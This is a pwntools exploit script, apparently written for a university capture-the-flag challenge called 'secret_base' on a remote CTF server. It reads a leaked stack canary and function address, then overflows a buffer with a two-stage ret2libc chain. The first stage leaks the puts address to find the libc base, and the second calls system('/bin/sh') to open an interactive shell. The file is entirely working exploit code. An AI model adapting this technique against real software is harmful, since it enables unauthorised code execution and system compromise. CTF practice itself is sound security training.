#!/usr/bin/python3

from pwn import *

PROG_NAME = "./secret_base"
REMOTE_IP = "pwn.ctf.unswsecurity.com"
REMOTE_PORT = 5003
REMOTE_LIBC = "./libc6-i386_2.31-0ubuntu9.3_amd64.so"
LOCAL_LIBC = "/lib32/libc.so.6"

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
    libc = ELF(REMOTE_LIBC)
else:
    p = process(PROG_NAME)
    elf = p.elf
    libc = ELF(LOCAL_LIBC)

if args.ATTACH:
	gdb.attach(p, '''break vuln''')

p.recvlines(2)
vuln_addr = int(p.recvline().rstrip().split()[-1], 16)
canary = u32(p.recvline().rstrip()[-4:])
print(canary)


elf.address = vuln_addr - elf.symbols['vuln']
print(hex(elf.plt['puts']), hex(elf.got['puts']))
binsh_addr = next(libc.search(b'/bin/sh'))

payload = b'A' * (0x24 - 0xc)
payload += p32(canary)
payload += b'A' * 0x4
payload += p32(elf.address + 0x4000)
payload += b'A' * 0x4
payload += p32(elf.plt['puts'])
payload += p32(elf.symbols['vuln'])
payload += p32(elf.got['putchar'])

p.sendline(payload)

puts_leak = u32(p.recvline()[:4])
print(hex(puts_leak))
libc_base = puts_leak - libc.symbols['puts']
libc.address = libc_base
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

p.recvlines(2)
vuln_addr = int(p.recvline().rstrip().split()[-1], 16)
canary = u32(p.recvline().rstrip()[-4:])
print(canary)

binsh_addr = next(libc.search(b'/bin/sh'))

payload = b'A' * (0x24 - 0xc)
payload += p32(canary)
payload += b'A' * 0x4
payload += p32(elf.address + 0x4000)
payload += b'A' * 0x4
payload += p32(libc.symbols['system'])
payload += p32(elf.symbols['vuln'])
payload += p32(binsh_addr)

p.sendline(payload)

p.interactive()